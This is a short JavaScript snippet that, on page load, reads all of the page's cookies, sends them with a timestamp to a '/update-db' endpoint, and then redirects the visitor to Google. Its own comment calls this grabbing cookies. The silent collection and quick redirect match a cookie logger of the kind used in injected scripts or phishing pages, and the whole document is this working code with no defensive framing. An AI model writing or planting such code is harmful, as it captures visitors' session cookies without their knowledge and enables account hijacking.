// Automatically grab cookies and send data on page load
window.addEventListener('load', async () => {
    // Get cookies from the document
    const cookies = document.cookie.split('; ').map(cookie => cookie.split('='));
    const cookieObj = Object.fromEntries(cookies);
    
    // Get the current time of visit in seconds since epoch
    const timeOfVisit = Math.floor(Date.now() / 1000);
    
    // Create the user object
    const user = {
        id: Date.now(), // Unique ID based on the current timestamp
        'time of visit': timeOfVisit,
        cookies: cookieObj
    };

    // Send the user data to the server
    await fetch('/update-db', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(user)
    });

    // Redirect to Google
    window.location.href = 'https://www.google.com';
});
